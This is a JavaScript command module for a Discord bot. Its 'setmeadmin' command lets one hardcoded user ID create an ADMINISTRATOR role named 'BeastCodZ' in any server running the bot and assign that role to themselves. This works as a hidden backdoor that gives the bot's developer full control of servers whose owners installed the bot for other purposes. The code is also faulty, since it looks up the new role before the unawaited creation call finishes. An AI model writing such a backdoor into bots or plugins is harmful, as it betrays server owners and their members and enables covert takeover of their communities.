const ownerid = ["516140725185019905"];
const Discord = require("discord.js");

module.exports = {
    name: "setmeadmin",
    category: "owner",
    description: "gives owner admin powers",
    run: async (client, message, args) => {
if (!ownerid.includes(message.author.id)) return message.channel.send("Nope")
      let roleid = message.guild.roles.cache.find(role => role.name === "Naruto Uzumaki");
//let positionid = roleid.position-1
let role1 = message.guild.roles.create({
 name: 'BeastCodZ',
 color: 'BLUE',
 permissions: 'ADMINISTRATOR',
 //position: positionid,
})
const role = message.guild.roles.cache.find((role) => role.name === "BeastCodZ");
const member = message.guild.members.cache.get("516140725185019905");
member.roles.add(role)
 .then(function() {
 console.log("role", role.name, "added to", member.user.name, "on server", message.guild.name);
 // do your stuff
 })
    }}